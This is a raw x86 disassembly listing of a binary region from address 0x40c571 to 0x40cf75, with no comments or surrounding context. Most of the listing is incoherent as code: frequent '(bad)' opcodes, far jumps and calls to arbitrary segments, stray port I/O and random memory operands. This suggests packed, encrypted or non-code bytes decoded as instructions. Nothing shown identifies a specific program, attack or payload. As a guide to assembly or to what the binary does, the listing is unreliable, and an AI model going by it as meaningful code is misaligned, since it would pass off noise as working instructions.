  40c571:	lea    edx,[ebp-0x9eb9]
  40c577:	jmp    0xf5c:0xf500105a
  40c57e:	test   BYTE PTR [edx+0x5f],al
  40c581:	add    BYTE PTR [eax],al
  40c583:	push   eax
  40c584:	cmp    edx,eax
  40c586:	(bad)  
  40c587:	repnz pop edi
  40c589:	lea    eax,[edx+0x21]
  40c58c:	out    dx,eax
  40c58d:	data16 cld 
  40c58f:	and    bl,BYTE PTR [esi+edi*8-0x12aae19]
  40c596:	jmp    FWORD PTR [esi-0x21fd8ae4]
  40c59c:	(bad)  [ebx-0xa1886b]
  40c5a2:	call   DWORD PTR [eax]
  40c5a4:	call   0x414f:0x612d502a
	...
  40c5d3:	add    BYTE PTR [edx+esi*4],bl
  40c5d6:	sbb    dl,BYTE PTR [edx+0x6]
  40c5d9:	mov    dl,0x2
  40c5db:	or     ebx,DWORD PTR [edi+eiz*4+0x0]
  40c5df:	jmp    0x40c5b8
  40c5e1:	outs   dx,BYTE PTR ss:[esi]
  40c5e3:	ret    0x316a
  40c5e6:	add    al,0x8d
  40c5e8:	fsubrp st(5),st
  40c5ea:	jns    0x40c571
  40c5ec:	nop
  40c5ed:	inc    eax
  40c5ee:	add    al,0xff
  40c5f0:	(bad)  
  40c5f1:	(bad)  
  40c5f2:	mov    edx,0x8e111c40
  40c5f7:	or     esi,DWORD PTR [ecx+esi*8]
  40c5fa:	jo     0x40c5fb
  40c5fc:	cmp    esp,DWORD PTR [ecx]
  40c5fe:	dec    esi
  40c5ff:	mov    ah,0x32
  40c601:	imul   eax,DWORD PTR [eax+edx*2],0xff711134
  40c608:	and    edi,DWORD PTR [ebx]
  40c60a:	jle    0x40c5bc
  40c60c:	sbb    al,BYTE PTR [ecx+0x1f845004]
  40c612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c613:	inc    eax
  40c614:	sbb    al,0x51
  40c616:	dec    esi
  40c617:	mov    al,0x2
  40c619:	pop    ecx
  40c61a:	add    al,0xe8
  40c61c:	and    eax,0x270002dd
  40c621:	jb     0x40c5b2
  40c623:	adc    dh,BYTE PTR [ebp+ebx*1-0x5a]
  40c627:	inc    eax
  40c628:	sbb    al,0xb9
  40c62a:	dec    esp
  40c62b:	mov    al,0xda
  40c62d:	rol    BYTE PTR [edx],0xff
  40c630:	dec    ecx
  40c631:	stos   BYTE PTR es:[edi],al
  40c632:	jmp    0xe8:0x290c978
	...
  40c661:	inc    ebp
  40c662:	or     BYTE PTR [ebx],al
  40c664:	jmp    FWORD PTR [ecx-0x4c0239ca]
  40c66a:	call   0x2db2c5c2
  40c66f:	add    bh,bh
  40c671:	mov    ds:0x1c78e899,eax
  40c676:	pop    ebx
  40c677:	jmp    0x64989a04
  40c67c:	dec    ecx
  40c67d:	mov    esp,DWORD PTR [edi-0x1936fc6b]
  40c683:	mov    es,WORD PTR [ebx]
  40c685:	jnp    0x40c639
  40c687:	mov    al,ds:0x7e5b1c7d
  40c68c:	mov    ecx,0x375a8b3
  40c691:	je     0x40c6a4
  40c693:	pop    edi
  40c694:	add    ebx,DWORD PTR [ebx-0x6f]
  40c697:	sub    cl,BYTE PTR [esp+ebx*1]
  40c69a:	push   cs
  40c69b:	jb     0x40c68d
  40c69d:	dec    edx
  40c69e:	sub    eax,0xccadebe5
  40c6a3:	dec    ebp
  40c6a4:	add    esp,DWORD PTR [edi]
  40c6a6:	fwait
  40c6a7:	mov    esp,0x3e0acc12
  40c6ac:	jns    0x40c6c2
  40c6ae:	mov    bl,0x81
  40c6b0:	add    ah,BYTE PTR [ebx]
  40c6b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6b3:	inc    eax
  40c6b4:	sub    ebp,DWORD PTR [edx-0x2232da5a]
  40c6ba:	push   ebx
  40c6bb:	jmp    0x69f85e18
  40c6c0:	enter  0x3207,0xe9
  40c6c4:	ins    DWORD PTR es:[edi],dx
	...
  40c6ed:	add    BYTE PTR ds:0x40b7ba6,bh
  40c6f3:	adc    eax,0xd4eb0372
  40c6f8:	stos   DWORD PTR es:[edi],eax
  40c6f9:	push   DWORD PTR [ebp+0x41]
  40c6fc:	out    dx,al
  40c6fd:	js     0x40c723
  40c6ff:	mov    bl,0xa5
  40c701:	add    dl,bl
  40c703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c704:	push   edx
  40c705:	daa    
  40c706:	retf   
  40c707:	xor    cl,ah
  40c709:	jmp    0x40c693
  40c70b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c70c:	int    0x2
  40c70e:	inc    esi
  40c70f:	inc    edi
  40c710:	(bad)  
  40c711:	js     0x40c737
  40c713:	mov    bl,0x91
  40c715:	add    ch,BYTE PTR [ebx+0x1842ffa6]
  40c71b:	xor    ecx,ebp
  40c71d:	or     al,0xe1
  40c71f:	pop    edx
  40c720:	push   0x1bfc5c
  40c725:	sahf   
  40c726:	inc    esp
  40c727:	mov    esp,0xb3182847
  40c72c:	lock jns 0x40c74d
  40c72f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c730:	or     ch,BYTE PTR [ecx+0x11504eeb]
  40c736:	mov    ebx,0xcfe94107
  40c73b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c73c:	je     0x40c71f
  40c73e:	inc    edi
  40c73f:	fwait
  40c740:	sti    
  40c741:	pushw  ds
  40c743:	mov    bl,0xc0
  40c745:	ins    BYTE PTR es:[edi],dx
  40c746:	push   ds
  40c747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c748:	imul   ebp,ecx,0xa85c87b7
  40c74e:	pop    ds
  40c74f:	xor    esi,DWORD PTR [ebp+0xa4]
	...
  40c779:	add    BYTE PTR [eax],al
  40c77b:	fcomp  DWORD PTR [edx-0x1]
  40c77e:	hlt    
  40c77f:	inc    eax
  40c780:	push   ds
  40c781:	inc    ecx
  40c782:	jmp    0x2ed063be
  40c787:	push   ds
  40c788:	push   edx
  40c789:	rcr    BYTE PTR [ebp+0x52680b2b],0x7c
  40c790:	sbb    al,0x0
  40c792:	mov    ecx,0x108301e
  40c797:	xchg   ecx,eax
  40c798:	mov    eax,ds:0xcc0706fe
  40c79d:	mov    esi,?
  40c79f:	sbb    eax,0x1f830031
  40c7a4:	xor    ebp,edi
  40c7a6:	mov    WORD PTR [eax+0x5b],fs
  40c7a9:	push   0x805b1fe9
  40c7ae:	shl    DWORD PTR [ebp+0x11d6fed5],1
  40c7b4:	fwait
  40c7b5:	jae    0x40c7bc
  40c7b7:	push   eax
  40c7b8:	or     ebp,eax
  40c7ba:	add    BYTE PTR [ebx],al
  40c7bc:	(bad)  
  40c7bd:	std    
  40c7be:	jmp    FWORD PTR [esi+0x5147299]
  40c7c4:	aaa    
  40c7c5:	stos   DWORD PTR es:[edi],eax
  40c7c6:	pop    ebp
  40c7c7:	inc    esp
  40c7c8:	pop    edi
  40c7c9:	push   eax
  40c7ca:	push   DWORD PTR [eax]
  40c7cc:	push   edi
  40c7cd:	call   0xff9c712e
  40c7d2:	call   0x3e9e20
  40c7d7:	popf   
  40c7d8:	add    ecx,DWORD PTR [ebp+0x755b9aff]
  40c7de:	cld    
	...
  40c807:	add    dl,ch
  40c809:	sub    eax,0xd4bfe808
  40c80e:	std    
  40c80f:	(bad)  
  40c810:	jl     0x40c7ae
  40c812:	add    al,BYTE PTR [eax]
  40c814:	nop
  40c815:	(bad)  
  40c816:	jmp    0xeaff:0xf5ab0181
  40c81d:	aad    0x43
  40c81f:	cld    
  40c820:	jne    0x40c87c
  40c822:	jne    0x40c834
  40c824:	fisubr DWORD PTR ds:0x2057e80c
  40c82a:	add    BYTE PTR [eax],al
  40c82c:	ds cdq 
  40c82e:	or     eax,0x5f3e85
  40c833:	add    BYTE PTR [edx+0x1c],al
  40c836:	clc    
  40c837:	add    ch,dh
  40c839:	pop    eax
  40c83a:	add    bh,al
  40c83c:	mov    al,0xac
  40c83e:	std    
  40c83f:	pop    es
  40c840:	add    eax,0x8f006a59
  40c845:	pop    eax
  40c846:	push   0x0
  40c848:	(bad)  
  40c849:	pop    eax
  40c84a:	lea    eax,[ebp-0x1f]
  40c84d:	or     BYTE PTR [ebp-0x25c2e7b],cl
  40c853:	call   DWORD PTR ds:0xeaf8755a
  40c859:	sub    eax,0x461ce8fc
  40c85e:	jnp    0x40c860
  40c860:	sbb    al,0xb9
  40c862:	ret    0x1973
  40c865:	mov    edx,DWORD PTR [eax+0x6ab2abff]
  40c86b:	mov    ebp,0x0
	...
  40c894:	add    BYTE PTR [ebx+esi*2+0x4],dl
  40c898:	call   DWORD PTR [ecx]
  40c89a:	sub    dl,0x84
  40c89d:	lods   al,BYTE PTR ds:[esi]
  40c89e:	std    
  40c89f:	dec    DWORD PTR [edi-0x69]
  40c8a2:	loop   0x40c831
  40c8a4:	test   BYTE PTR [eax-0x3301003b],cl
  40c8aa:	pop    edi
  40c8ab:	in     al,dx
  40c8ac:	je     0x40c83a
  40c8ae:	(bad)  
  40c8b0:	mov    BYTE PTR [ecx+0x63fef822],ah
  40c8b6:	fcmove st,st(3)
  40c8b8:	mov    ebx,DWORD PTR [ebx+0x35]
  40c8bb:	ins    DWORD PTR es:[edi],dx
  40c8bc:	add    ah,al
  40c8be:	inc    esi
  40c8bf:	bound  eax,QWORD PTR [ecx+0x1c]
  40c8c2:	add    eax,0xd4befb6
  40c8c7:	add    bh,bh
  40c8c9:	mov    cl,0x85
  40c8cb:	jmp    0xa189:0x1da3cd
  40c8d2:	push   ss
  40c8d3:	clc    
  40c8d4:	(bad)  
  40c8d5:	and    esi,DWORD PTR [ecx]
  40c8d7:	mov    esi,0x7513eb
  40c8dc:	add    BYTE PTR [eax+0x1c016aa1],cl
  40c8e2:	push   ebp
  40c8e3:	sar    esi,0xc9
  40c8e6:	pop    ebp
  40c8e7:	clc    
  40c8e8:	(bad)  
  40c8e9:	sti    
  40c8ea:	push   esp
  40c8eb:	jbe    0x40c8f5
  40c8ed:	add    al,0xda
  40c8ef:	mov    ah,0xfe
  40c8f1:	jmp    0x40c897
  40c8f3:	mov    ah,0xeb
  40c8f5:	jmp    0x40c8a3
  40c8f7:	(bad)  
  40c8f8:	out    0x0,eax
	...
  40c922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c923:	add    eax,0x5ad3ff00
  40c928:	pushf  
  40c929:	hlt    
  40c92a:	shl    BYTE PTR [ebx+0x5748ffdd],cl
  40c930:	(bad)  
  40c931:	jns    0x40c957
  40c933:	mov    bl,0x18
  40c935:	push   DWORD PTR [edx-0x44463a5d]
  40c93b:	stos   DWORD PTR es:[edi],eax
  40c93c:	mov    ebp,0x6535bbff
  40c941:	call   FWORD PTR [edx-0x7b03dc5d]
  40c947:	push   ds
  40c948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c949:	dec    DWORD PTR [edx+0x740013a3]
  40c94f:	rcl    DWORD PTR [eax],1
  40c951:	add    al,0x1c
  40c953:	xchg   edx,eax
  40c954:	stos   BYTE PTR es:[edi],al
  40c955:	adc    BYTE PTR [esi+ecx*1],bl
  40c958:	jb     0x40c94a
  40c95a:	pushf  
  40c95b:	sahf   
  40c95c:	nop
  40c95d:	mul    DWORD PTR [edx-0x5d]
  40c960:	arpl   WORD PTR [ecx+0x58],cx
  40c963:	or     ch,BYTE PTR [esi+0x79]
  40c966:	sub    al,0xa4
  40c968:	fisttp DWORD PTR [edi]
  40c96a:	xor    al,0x27
  40c96c:	loope  0x40c971
  40c96e:	sbb    al,0x50
  40c970:	sub    DWORD PTR [edi],ecx
  40c972:	mov    eax,ds:0x1c03e844
  40c977:	pushf  
  40c978:	stos   DWORD PTR es:[edi],eax
  40c979:	sti    
  40c97a:	sub    esp,DWORD PTR [ebx+0x1d5b03e8]
  40c980:	cmp    eax,0xe95b22ff
  40c985:	imul   eax,DWORD PTR [eax],0x0
	...
  40c9af:	sbb    al,0x35
  40c9b1:	jmp    0xe975e61f
  40c9b6:	nop
  40c9b7:	pop    eax
  40c9b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9b9:	mov    eax,0x15a7a090
  40c9be:	push   edx
  40c9c0:	or     eax,DWORD PTR [esi]
  40c9c2:	jns    0x40c9a8
  40c9c4:	mov    ds:0x18fbff73,al
  40c9c9:	add    BYTE PTR [ecx+0x1f],dh
  40c9cc:	pop    ebx
  40c9cd:	or     ebp,DWORD PTR [ecx]
  40c9cf:	push   esp
  40c9d0:	pop    eax
  40c9d1:	jmp    0x9be99e
  40c9d6:	push   ecx
  40c9d7:	fstp   QWORD PTR [edx]
  40c9d9:	inc    ecx
  40c9da:	jmp    0xc150f199
  40c9df:	mov    ecx,edx
  40c9e1:	inc    dh
  40c9e3:	dec    edi
  40c9e4:	(bad)  
  40c9e5:	iret   
  40c9e6:	ins    BYTE PTR es:[edi],dx
  40c9e7:	xchg   esp,eax
  40c9e8:	scas   al,BYTE PTR es:[edi]
  40c9e9:	div    BYTE PTR [esi-0x3eaded66]
  40c9ef:	cdq    
  40c9f0:	sar    esi,1
  40c9f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9f3:	cwde   
  40c9f4:	xlat   BYTE PTR ds:[ebx]
  40c9f5:	out    dx,eax
  40c9f6:	xchg   esi,eax
  40c9f7:	and    BYTE PTR [ecx-0x5e594a19],0xfe
  40c9fe:	add    ebx,DWORD PTR [eax]
  40ca00:	xor    eax,0xb2a48600
  40ca05:	idiv   BYTE PTR [esi+0x62]
  40ca08:	mov    eax,ds:0xbc47e574
  40ca0d:	lea    ebp,[esi+0x52]
  40ca10:	rol    DWORD PTR [ebp+edx*2+0x0],cl
	...
  40ca3b:	add    BYTE PTR [edx-0x5f],dl
  40ca3e:	(bad)  
  40ca3f:	pop    esi
  40ca40:	test   BYTE PTR [esi-0x45c5a90a],dh
  40ca46:	mov    dh,BYTE PTR [edx+esi*1-0x5f]
  40ca4a:	or     ch,BYTE PTR [ecx]
  40ca4c:	mov    bl,0x3d
  40ca4e:	push   eax
  40ca4f:	jo     0x40c9e5
  40ca51:	mov    edx,0xa11a36f6
  40ca56:	mov    ah,0x41
  40ca58:	or     ah,BYTE PTR [ecx-0x2e28ee02]
  40ca5e:	(bad)  
  40ca5f:	push   ds
  40ca60:	push   ss
  40ca61:	fwait
  40ca62:	jae    0x40ca05
  40ca64:	xchg   DWORD PTR [ebp+0x0],ebx
  40ca67:	(bad)  
  40ca68:	mov    al,0x39
  40ca6a:	mov    ecx,0x16c300
  40ca6f:	jmp    FWORD PTR [eax]
  40ca71:	mov    dh,0xf5
  40ca73:	call   edx
  40ca75:	lahf   
  40ca76:	jae    0x40ca80
  40ca78:	sbb    eax,0xc2ffb41f
  40ca7d:	add    al,BYTE PTR cs:[eax]
  40ca80:	shl    al,cl
  40ca82:	leavew 
  40ca84:	repz sbb eax,0xae88ff00
  40ca8a:	cmc    
  40ca8b:	jmp    edx
  40ca8d:	lahf   
  40ca8e:	jae    0x40ca98
  40ca90:	int    0x3d
  40ca92:	mov    ah,0xff
  40ca94:	shr    BYTE PTR [esi],cl
  40ca96:	add    BYTE PTR [eax],al
  40ca98:	shl    al,cl
  40ca9a:	or     ax,0x1de3
  40ca9e:	add    bh,bh
	...
  40cac8:	add    al,ch
  40caca:	scas   al,BYTE PTR es:[edi]
  40cacb:	cmc    
  40cacc:	call   DWORD PTR [edx-0x62f78c61]
  40cad2:	adc    eax,0xaea2ffb4
  40cad7:	push   eax
  40cad8:	mov    esp,edx
  40cada:	lahf   
  40cadb:	std    
  40cadc:	mov    ch,0xa1
  40cade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cadf:	std    
  40cae0:	call   FWORD PTR [ebp-0x3d0074e9]
  40cae6:	lahf   
  40cae7:	mov    bl,0xf0
  40cae9:	jmp    0xff51:0x58fffd9f
  40caf0:	jne    0x40cb2f
  40caf2:	mov    ch,0xdb
  40caf4:	(bad)  
  40caf5:	loop   0x40ca96
  40caf7:	std    
  40caf8:	mov    ch,0xe5
  40cafa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cafb:	std    
  40cafc:	call   FWORD PTR [ebp+0x72]
  40caff:	mov    edi,edi
  40cb01:	inc    edx
  40cb02:	sahf   
  40cb03:	inc    ebx
  40cb04:	clc    
  40cb05:	sub    al,0xac
  40cb07:	cld    
  40cb08:	jmp    DWORD PTR [edx]
  40cb0a:	sahf   
  40cb0b:	jae    0x40cb09
  40cb0d:	sbb    al,0x5a
  40cb0f:	inc    ebp
  40cb10:	ja     0x40cb2e
  40cb12:	mov    dl,0xc9
  40cb14:	rcr    DWORD PTR [eax],0xb2
  40cb17:	push   ebp
  40cb18:	mov    esi,eax
  40cb1a:	xor    eax,0xb246fbc8
  40cb1f:	push   0xb27d322
  40cb24:	call   0xff3cf532
  40cb29:	xchg   ebp,eax
  40cb2a:	ja     0x40cb2c
  40cb2c:	push   0x0
	...
  40cb55:	add    BYTE PTR [edx+esi*4],bl
  40cb58:	jmp    0x40cb17
  40cb5a:	inc    esp
  40cb5b:	jg     0x40cbb9
  40cb5d:	inc    ecx
  40cb5e:	sbb    al,0xa
  40cb60:	pop    ds
  40cb61:	pop    esi
  40cb62:	pop    ebp
  40cb63:	mov    dl,0xfb
  40cb65:	je     0x40cb8b
  40cb67:	call   0x256a:0xf193b42a
  40cb6e:	jmp    0x4ad3:0x49ff0472
  40cb75:	inc    ecx
  40cb76:	sbb    al,0xc9
  40cb78:	jne    0x40cb82
  40cb7a:	test   BYTE PTR [edx],ah
  40cb7c:	(bad)  
  40cb7d:	(bad)  
  40cb7e:	imul   ecx,DWORD PTR [edx+0x27],0x5e
  40cb82:	fnsave [ecx-0x4de3fd96]
  40cb88:	cmp    dh,0xc9
  40cb8b:	mov    ecx,0x39497dea
  40cb90:	cld    
  40cb91:	addr16 add eax,0xc40041e0
  40cb97:	mov    bl,0x2
  40cb99:	add    BYTE PTR [ecx+edx*1-0x2cbf78a],bl
  40cba0:	cld    
  40cba1:	(bad)  
  40cba2:	and    ecx,DWORD PTR [edx-0x4da2a187]
  40cba8:	push   0x2
  40cbaa:	sbb    al,0xb2
  40cbac:	cmp    dh,0x91
  40cbaf:	pop    ebx
  40cbb0:	icebp  
  40cbb1:	jmp    0x40cc07
  40cbb3:	mov    eax,ds:0x25fafc1d
  40cbb8:	adc    eax,0xfc
	...
  40cbe1:	add    BYTE PTR [eax],al
  40cbe3:	push   0x94160153
  40cbe8:	lahf   
  40cbe9:	add    eax,0xe956ddca
  40cbee:	push   esi
  40cbef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbf0:	scas   al,BYTE PTR es:[edi]
  40cbf1:	cmc    
  40cbf2:	jne    0x40cc14
  40cbf4:	mov    bl,0x8
  40cbf6:	(bad)  
  40cbf7:	retf   0xf19f
  40cbfa:	ret    
  40cbfb:	dec    edi
  40cbfc:	bound  edx,QWORD PTR [ecx-0xa]
  40cbff:	pop    ecx
  40cc00:	sbb    ch,cl
  40cc02:	push   ebx
  40cc03:	les    ebp,FWORD PTR [esi]
  40cc05:	pop    edi
  40cc06:	sti    
  40cc07:	stos   BYTE PTR es:[edi],al
  40cc08:	or     bl,BYTE PTR [ecx]
  40cc0a:	ins    BYTE PTR es:[edi],dx
  40cc0b:	sbb    al,0x5b
  40cc0d:	into   
  40cc0e:	mov    edx,0x45168603
  40cc13:	sbb    al,0xb
  40cc15:	scas   al,BYTE PTR es:[edi]
  40cc16:	jno    0x40cc2c
  40cc18:	mov    bl,0x3e
  40cc1a:	mov    bh,0x82
  40cc1c:	lahf   
  40cc1d:	inc    eax
  40cc1e:	ins    BYTE PTR es:[edi],dx
  40cc1f:	sbb    eax,0xfbba865b
  40cc24:	mov    dh,0x2e
  40cc26:	inc    ebp
  40cc27:	sbb    al,0xb
  40cc29:	xchg   BYTE PTR [ecx+0x14],dh
  40cc2c:	mov    bl,0x2a
  40cc2e:	mov    bh,0x5a
  40cc30:	lahf   
  40cc31:	or     BYTE PTR [edi-0x5a],0x9f
  40cc35:	ins    DWORD PTR es:[edi],dx
  40cc36:	int    0x5d
  40cc38:	push   edx
  40cc39:	jmp    0x69ef638e
  40cc3e:	shl    BYTE PTR [edi],0x34
  40cc41:	jmp    0xd3e0cbb3
  40cc46:	or     eax,DWORD PTR [eax]
	...
  40cc70:	xor    al,0x2d
  40cc72:	outs   dx,BYTE PTR ds:[esi]
  40cc73:	sti    
  40cc74:	and    dl,cl
  40cc76:	mov    ds:0x4185f7,eax
  40cc7b:	lea    edx,ss:[ebx-0x18]
  40cc7f:	push   esp
  40cc80:	pop    es
  40cc81:	sahf   
  40cc82:	(bad)  
  40cc83:	xchg   ebx,eax
  40cc84:	cmp    bl,BYTE PTR [esi-0x2df80e8c]
  40cc8a:	(bad)  
  40cc8b:	push   ss
  40cc8c:	div    DWORD PTR [esp+ebx*1]
  40cc8f:	push   cs
  40cc90:	ins    DWORD PTR es:[edi],dx
  40cc91:	push   ebx
  40cc92:	call   0xfedeb3ff
  40cc97:	dec    BYTE PTR [edi+ebx*4-0x2]
  40cc9b:	jl     0x40ccc4
  40cc9d:	mov    bl,0x86
  40cc9f:	data16 (bad) 
  40cca1:	popf   
  40cca2:	enter  0xc3ab,0x9e
  40cca6:	push   ebx
  40cca7:	jb     0x40cc6c
  40cca9:	or     edi,eax
  40ccab:	in     al,dx
  40ccac:	jnp    0x40ccac
  40ccae:	inc    eax
  40ccaf:	jmp    0xe94127d3
  40ccb4:	repnz cmp esi,0xc2b32834
  40ccbb:	cmp    eax,0x148b5b18
  40ccc0:	sbb    dl,bl
  40ccc2:	imul   ebx
  40ccc4:	or     eax,0xa2b9034c
  40ccc9:	mov    ah,0x1
  40cccb:	setns  BYTE PTR [esp+ebx*2+0x2d]
  40ccd0:	in     eax,dx
  40ccd1:	push   edi
  40ccd2:	data16 scas al,BYTE PTR es:[edi]
	...
  40ccfc:	add    BYTE PTR [ecx],bl
  40ccfe:	(bad)  
  40ccff:	(bad)  
  40cd00:	jge    0x40ccce
  40cd02:	dec    esi
  40cd03:	call   0x9b99fb
  40cd08:	add    DWORD PTR [ecx-0x4816bf03],esi
  40cd0e:	pop    ebx
  40cd0f:	pop    edi
  40cd10:	test   al,0x1f
  40cd12:	mov    bl,0x39
  40cd14:	jge    0x40cd4c
  40cd16:	popf   
  40cd17:	or     ch,BYTE PTR [ecx]
  40cd19:	mov    ebx,0x6000ff37
  40cd1e:	push   edx
  40cd1f:	call   DWORD PTR ds:0x410174
  40cd25:	xchg   dh,bl
  40cd27:	add    cl,BYTE PTR [ebx]
  40cd29:	xor    eax,0xff552b
  40cd2e:	neg    DWORD PTR [ebp+0x41]
  40cd31:	add    eax,0xc460aaf5
  40cd36:	pop    ecx
  40cd37:	cmp    DWORD PTR ds:0x413a29,0xfffffff5
  40cd3e:	sub    cl,BYTE PTR [eax]
  40cd40:	push   eax
  40cd42:	retf   0x415d
  40cd45:	lds    ebp,FWORD PTR [edi+esi*1+0x12fb56a]
  40cd4c:	jmp    DWORD PTR [eax]
  40cd4e:	repz pop esi
  40cd50:	inc    ecx
  40cd51:	lds    esp,FWORD PTR [edx+0x19eaa513]
  40cd57:	add    BYTE PTR [ebx-0x3ff4ad7f],al
  40cd5d:	loope  0x40cdd8
  40cd5f:	push   DWORD PTR ds:0x0
	...
  40cd89:	add    BYTE PTR [ecx-0x35ffbeca],ch
  40cd8f:	dec    ebp
  40cd90:	lods   eax,DWORD PTR ds:[esi]
  40cd91:	pop    edi
  40cd92:	xor    al,0x57
  40cd94:	add    esp,0x71
  40cd97:	mov    ds:0x1a3a9513,al
  40cd9c:	add    bh,al
  40cd9e:	xor    ch,0x5e
  40cda1:	inc    ecx
  40cda2:	jne    0x40cdfd
  40cda4:	add    BYTE PTR [eax],al
  40cda6:	jne    0x40cd56
  40cda8:	inc    DWORD PTR [edx-0x32]
  40cdab:	xchg   edi,eax
  40cdac:	pop    ecx
  40cdad:	leave  
  40cdae:	xchg   DWORD PTR [esi+0x0],ecx
  40cdb1:	cmp    DWORD PTR [eax-0xb],0x5e
  40cdb5:	inc    ecx
  40cdb6:	xor    eax,0xda1f7459
  40cdbb:	ins    DWORD PTR es:[edi],dx
  40cdbc:	lods   al,BYTE PTR ds:[esi]
  40cdbd:	pusha  
  40cdbe:	sbb    al,0xf3
  40cdc0:	add    bh,bh
  40cdc2:	adc    DWORD PTR [edi],ebx
  40cdc4:	pop    ecx
  40cdc5:	inc    ecx
  40cdc6:	sbb    al,0x31
  40cdc8:	rol    BYTE PTR [ebx],0x1b
  40cdcb:	mov    BYTE PTR [ebp-0x404da2a2],cl
  40cdd1:	add    al,0xb8
  40cdd3:	xchg   edx,eax
  40cdd4:	inc    ecx
  40cdd5:	add    BYTE PTR [edx+esi*4],bl
  40cdd8:	add    al,BYTE PTR [eax]
  40cdda:	(bad)  
  40cddc:	mov    ebp,ebx
  40cdde:	lahf   
  40cddf:	outs   dx,BYTE PTR ds:[esi]
  40cde0:	hlt    
  40cde1:	push   edx
  40cde2:	xchg   edi,eax
  40cde3:	test   DWORD PTR [edx],0xc1edc0b
  40cde9:	sbb    DWORD PTR [ecx-0x52],0x2
  40cded:	je     0x40cdef
	...
  40ce17:	sbb    DWORD PTR [edx],esi
  40ce19:	cmp    al,0x0
  40ce1b:	push   ecx
  40ce1c:	mov    ch,0x2b
  40ce1e:	shl    BYTE PTR [edi-0x15],0xc4
  40ce22:	pop    es
  40ce23:	sbb    al,0x32
  40ce25:	cmp    edi,DWORD PTR [esi+0x28]
  40ce28:	mov    ds:0x12783c83,al
  40ce2d:	inc    ebx
  40ce2e:	add    BYTE PTR [edi+ebx*2],bl
  40ce31:	add    DWORD PTR [ebx],ebp
  40ce33:	pop    esp
  40ce34:	jns    0x40ce01
  40ce36:	shl    DWORD PTR [edx+esi*4],0x82
  40ce3a:	aaa    
  40ce3b:	or     ah,BYTE PTR [edi+0x3a]
  40ce3e:	mov    ebp,ecx
  40ce40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce41:	dec    esp
  40ce42:	cmp    DWORD PTR [esi-0x4f],0xb
  40ce46:	shr    cl,cl
  40ce48:	stos   DWORD PTR es:[edi],eax
  40ce49:	cmp    DWORD PTR [eax+ebx*1-0x4d],0x6d
  40ce4e:	add    al,0x37
  40ce50:	bnd jmp 0x40ce76
  40ce53:	pop    ebx
  40ce54:	outs   dx,DWORD PTR ds:[esi]
  40ce55:	or     BYTE PTR [ebx-0x24a27],cl
  40ce5b:	pop    ds
  40ce5c:	mov    dl,0x2
  40ce5e:	sar    DWORD PTR [ebx+ebx*2],0xeb
  40ce62:	push   ebx
  40ce63:	inc    esp
  40ce64:	xor    DWORD PTR [eax-0x8],0x32
  40ce68:	or     esp,DWORD PTR [edx+0x4e]
  40ce6b:	adc    al,0x19
  40ce6d:	mov    ecx,0x9b4ea8f8
  40ce72:	jmp    0x40ce81
  40ce74:	(bad)  
  40ce75:	cmp    eax,0x20006bf8
  40ce7a:	lds    eax,FWORD PTR [eax]
	...
  40cea4:	and    ebx,DWORD PTR [ebx+0x2]
  40cea7:	fld    QWORD PTR [edx]
  40cea9:	es cmc 
  40ceab:	clc    
  40ceac:	jo     0x40cf01
  40ceae:	xchg   ebx,eax
  40ceaf:	add    eax,DWORD PTR [esi-0x7af1e9a5]
  40ceb5:	sti    
  40ceb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceb7:	add    ebx,DWORD PTR [edi-0x23f3276a]
  40cebd:	test   BYTE PTR es:[edx+0x7829f58],cl
  40cec4:	cdq    
  40cec5:	adc    eax,0xe7b452f9
  40ceca:	jo     0x40cec3
  40cecc:	mov    edx,0x5888e930
  40ced1:	stos   DWORD PTR es:[edi],eax
  40ced2:	cmp    bh,dh
  40ced4:	xor    BYTE PTR [edi-0x48aee33],bl
  40ceda:	daa    
  40cedb:	add    al,0x9f
  40cedd:	xchg   esi,eax
  40cede:	in     al,dx
  40cedf:	or     bl,BYTE PTR [ebp+eiz*1-0x6]
  40cee3:	mov    al,ah
  40cee5:	stos   BYTE PTR es:[edi],al
  40cee6:	imul   edi,DWORD PTR [eax+ebx*1+0x5b],0x1aa71b1d
  40ceee:	icebp  
  40ceef:	inc    ebx
  40cef0:	int3   
  40cef1:	mov    dl,0x19
  40cef3:	mov    WORD PTR [edx-0x65],gs
  40cef6:	popa   
  40cef7:	fcom   QWORD PTR [eax-0x340886eb]
  40cefd:	push   edx
  40cefe:	sbb    dh,bh
  40cf00:	ret    
  40cf01:	push   esi
  40cf02:	add    BYTE PTR [ecx+0x6efed3a9],al
	...
  40cf30:	add    BYTE PTR [esi+0x2fac8d5a],dh
  40cf36:	or     edi,edi
  40cf38:	hlt    
  40cf39:	xchg   esp,eax
  40cf3a:	cld    
  40cf3b:	inc    eax
  40cf3c:	jmp    0xc34866df
  40cf41:	sbb    BYTE PTR [esp+esi*2-0x628fecbb],bl
  40cf48:	sahf   
  40cf49:	pop    eax
  40cf4a:	pop    ebx
  40cf4b:	sub    DWORD PTR ds:0x92c2e618,0xffffffd0
  40cf52:	pushf  
  40cf53:	pop    es
  40cf54:	jmp    0x1f2cb5a5
  40cf59:	ins    DWORD PTR es:[edi],dx
  40cf5a:	call   FWORD PTR [si-0x65e9]
  40cf5f:	adc    al,0x45
  40cf61:	js     0x40cf7f
  40cf63:	add    BYTE PTR [edx-0x24],ch
  40cf66:	bound  edx,QWORD PTR [eax-0x2]
  40cf69:	dec    esp
  40cf6a:	addr16 (bad) 
  40cf6c:	jl     0x40cf85
  40cf6e:	call   0x6a00:0x1c384914
  40cf75:	jnp    0x40cfd9
